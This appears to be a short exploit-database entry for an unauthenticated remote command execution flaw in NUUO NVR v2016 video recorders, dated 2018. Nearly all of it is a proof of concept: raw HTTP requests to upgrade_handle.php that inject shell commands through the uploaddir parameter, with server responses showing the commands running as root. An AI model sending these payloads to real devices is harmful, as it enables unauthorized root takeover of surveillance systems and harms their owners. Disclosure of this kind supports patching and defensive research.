# Exploit Title: NUUO NVR Unauthenticated Remote Code Execution
# Exploit Author: Berk Dusunur
# Google Dork: N/A
# Date: 2018-07-21
# Vendor Homepage: http://www.nuuo.com/
# Software Link: http://www.nuuo.com/
# Affected Version: v2016
# Tested on: Parrot OS
# CVE : N/A


# Proof Of Concept


GET /upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;whoami;%27 HTTP/1.1
Host: target:50000
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=7b74657ab949a442c9e440ccf050de1e; lang=en

HTTP/1.1 200 OK
X-Powered-By: PHP/5.6.13
Content-type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Date: Sat, 21 Jul 2018 15:54:09 GMT
Server: lighttpd/1.4.39

upload_tmp_dir=/mtd/block3 root

GET /upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;id;%27 HTTP/1.1
Host: target:5000
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=7b74657ab949a442c9e440ccf050de1e; lang=en



HTTP/1.1 200 OK
X-Powered-By: PHP/5.6.13
Content-type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Date: Sat, 21 Jul 2018 15:54:09 GMT
Server: lighttpd/1.4.39


upload_tmp_dir=/mtd/block3 uid=0(root) gid=0(root)